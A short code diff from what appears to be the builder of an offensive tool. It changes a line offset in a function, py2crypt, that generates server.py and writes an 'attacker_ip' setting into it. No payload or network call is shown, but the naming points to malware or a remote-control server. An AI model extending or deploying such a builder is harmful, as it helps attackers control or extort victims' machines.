@@ -48,7 +48,7 @@ def py2crypt():
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 52
+        i = 59
         f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip+ '\'' + '\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
